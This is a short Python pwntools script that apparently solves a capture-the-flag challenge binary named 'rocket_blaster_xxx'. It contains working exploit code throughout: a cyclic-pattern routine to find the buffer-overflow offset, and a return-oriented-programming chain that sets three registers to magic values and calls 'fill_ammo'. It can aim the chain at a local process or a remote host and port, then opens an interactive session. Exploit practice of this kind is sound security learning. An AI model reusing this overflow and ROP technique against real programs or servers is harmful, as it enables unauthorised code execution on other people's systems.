from pwn import *
import sys

elf = ELF('./rocket_blaster_xxx')
rops = ROP(elf)

if ("remote" in sys.argv):
    p = remote("94.237.50.242", 56847)
else:
    p = process(elf.path)
    if ("debug" in sys.argv):
        debug()

def debug():
    gdb.attach(p)

def get_offset():
    p.recvline()
    p.sendline(cyclic(200, n=8))
    p.wait()
    core = p.corefile
    success(f"Offset at {cyclic_find(core.fault_addr, n=8)}")

offset = 40

def exploit():
    p.recvuntil(">>")
    ropchain = [
        offset * b"A",
        p64(rops.ret[0]),
        p64(rops.rdi[0]),
        p64(0xdeadbeef),
        p64(rops.rsi[0]),
        p64(0xdeadbabe),
        p64(rops.rdx[0]),
        p64(0xdead1337),     
        p64(elf.symbols['fill_ammo']),      
    ]
    p.send(flat(ropchain))
    p.interactive()

#get_offset()
exploit()


